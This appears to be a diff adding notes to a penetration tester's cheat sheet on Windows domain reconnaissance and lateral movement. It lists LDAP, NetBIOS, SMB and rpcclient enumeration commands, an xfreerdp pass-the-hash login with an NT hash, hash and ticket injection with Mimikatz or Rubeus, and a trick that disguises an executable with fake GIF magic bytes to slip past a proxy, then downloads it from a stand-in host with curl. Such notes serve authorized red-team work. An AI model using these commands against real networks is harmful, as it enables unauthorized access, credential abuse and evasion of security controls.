@@ -1,0 +1,21 @@
+- LDAP
+	- `ldapsearch -H ldap://192.168.100.2 -x -LLL -W -D "anakin@contoso.local" -b "dc=contoso,dc=local" "(objectclass=computer)" "DNSHostName" "OperatingSystem"`
+		- Generally requires domain creds
+- `nbtscan 192.168.100.0/24`
+	- Scan NetBIOS name service on 137
+- `ntlm-info smb 192.168.100.0/24`
+	- Scan SMB
+- RDP
+	- `xfreerdp /u:Anakin@contoso.local /pth:cdeae556dc28c24b5b7b14e9df5b6e21 /v:192.168.122.143`
+	- From Windows, can inject NT hash/Kerb ticket with Mimikatz or Rubeus, then use mstsc.exe /restrictedadmin to RDP without password
+- RPCClient
+	- `rpcclient <IP> [-U '']`
+	- Enumerate domain users
+		- `rpcclient -enumdomusers`
+	- Display info on domain users
+		- `querydispinfo`
+- - If a proxy is blocking your files, try the following:
+	- Rename file and place false magic bytes at beginning
+		- `sed '1s/^/GIF87a/' calc.exe > calc.gif`
+	- Download, stripping the false magic bytes
+		- `curl.exe -qk -X GET -C 6 https://example.com/calc.gif > calc.exe`
